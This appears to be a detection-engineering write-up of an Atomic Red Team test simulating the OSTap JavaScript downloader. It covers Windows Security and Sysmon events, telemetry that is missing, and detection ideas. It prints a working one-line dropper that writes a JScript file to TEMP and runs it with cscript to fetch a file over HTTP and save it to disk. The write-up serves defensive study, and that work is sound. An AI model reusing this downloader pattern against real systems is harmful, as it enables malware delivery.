# T1204.002-2: Malicious File — OSTap Payload Download

## Technique Context

T1204.002 (User Execution: Malicious File) includes scenarios where users execute files that act as downloaders or droppers. OSTap is a JavaScript-based downloader that uses Windows Script Host (`cscript.exe` or `wscript.exe`) to execute embedded JavaScript that makes HTTP requests and saves the response to disk. The OSTap family used MSXML2.ServerXMLHTTP and ADODB.Stream objects — both built into Windows — to download and write secondary payloads without requiring any third-party tools. This approach predates PowerShell-based downloaders and remains relevant because it uses Windows COM objects that are not PowerShell-monitored paths, potentially bypassing PowerShell-focused detection.

Detection programs focus on `cscript.exe` or `wscript.exe` making network connections, JavaScript files appearing in TEMP directories, and the use of `MSXML2.ServerXMLHTTP` or `ADODB.Stream` COM objects in script execution.

## What This Dataset Contains

This dataset captures the complete OSTap-style download simulation. The attack chain starts in Security EID 4688, where `cmd.exe` (PID 0x404c) is created with the full JavaScript downloader command written inline:

`"cmd.exe" /c echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js & cscript //E:Jscript %TEMP%\OSTapGet.js`

This is the OSTap pattern in compact form: write the JavaScript source to a `.js` file in TEMP, then execute it via `cscript //E:Jscript`. Security EID 4688 also records the `cscript.exe` process (PID 0x3d84) with command line `cscript //E:Jscript C:\Windows\TEMP\OSTapGet.js`, confirming the JavaScript was written and executed.

Sysmon EID 1 captures multiple process creations including PING.EXE (a network connectivity check prior to the download) and both cmd.exe instances. The Sysmon channel provides 23 total events: 11 EID 7, 6 EID 1, 4 EID 10, 1 EID 17, and 1 EID 11. The EID 11 event confirms a file was created in the TEMP path context. Sysmon EID 10 shows PowerShell accessing the spawned processes, and the DLL loads (EID 7) include AMSI and Windows Defender components loading into `cscript.exe`, confirming endpoint protection scrutinized the script execution even with Defender nominally disabled.

The Security channel records 6 EID 4688 events: PING.EXE (initial connectivity check), whoami.exe (twice), cmd.exe (the echo/cscript compound command), cscript.exe, and a cleanup cmd.exe. The PowerShell channel provides 101 events, predominantly ART test framework boilerplate.

## What This Dataset Does Not Contain

No Sysmon EID 3 (network connection) event appears for the cscript.exe process making its HTTP request to GitHub, and no Sysmon EID 22 (DNS query) appears for `raw.githubusercontent.com`. This suggests either the download was blocked at the network level (possible given the AMSI/Defender component loading into cscript.exe), or the network events were not captured in the sampling window.

The output file `ostapout.txt` would have been created in the current working directory if the download succeeded. There is no Sysmon EID 11 confirming its creation, which — combined with the absence of network events — suggests the HTTP request may not have completed successfully despite Defender being disabled.

In the defended dataset (Sysmon: 20, Security: 12, PowerShell: 30), the cscript.exe exit code was `0x1` (failure). Without the network events in this undefended dataset, it is unclear whether the download succeeded or failed in this run.

## Assessment

The most forensically rich artifacts in this dataset are the Security EID 4688 command lines, which capture the complete JavaScript downloader source code in the cmd.exe command line argument. This is an unusual pattern — an attacker writing multi-line JavaScript code into a Windows cmd.exe command via `echo` with pipe redirection is distinctive and detectable from command-line content alone. The specificity of `MSXML2.ServerXMLHTTP` and `ADODB.Stream` appearing as strings in a cmd.exe argument is a high-confidence OSTap indicator.

The absence of network telemetry (both DNS and TCP) in a test where `raw.githubusercontent.com` should have been queried is itself informative — it suggests the AMSI/Defender integration may be suppressing network activity for cscript.exe even when Defender is nominally disabled, which is an important nuance for detection engineers to understand about this environment.

## Detection Opportunities Present in This Data

- **Security EID 4688**: `cmd.exe` with `echo var url = ... MSXML2.ServerXMLHTTP ... ADODB.Stream` in the command line — the presence of these COM object names in a cmd.exe argument is a high-confidence OSTap indicator requiring no further correlation
- **Security EID 4688**: The pattern `echo <javascript code> > %TEMP%\*.js & cscript //E:Jscript %TEMP%\*.js` is the canonical JavaScript dropper pattern — writing a script to TEMP then immediately executing it
- **Security EID 4688 / Sysmon EID 1**: `cscript.exe` with `//E:Jscript` argument loading a file from `%TEMP%` is anomalous; legitimate cscript usage typically references files in permanent locations
- **Sysmon EID 1**: `PING.EXE` as an immediate predecessor to suspicious script execution is a common connectivity pre-check pattern used by malware to verify network access before attempting downloads
- **Sysmon EID 7**: AMSI DLL and Defender components loading into `cscript.exe` — this combination indicates the script execution environment was inspected by endpoint protection; correlation with the subsequent execution outcome can reveal whether AMSI was effective
- **File system**: `C:\Windows\TEMP\OSTapGet.js` on disk is a forensic artifact; `.js` files in TEMP directories executed via cscript are characteristic of the OSTap and similar families
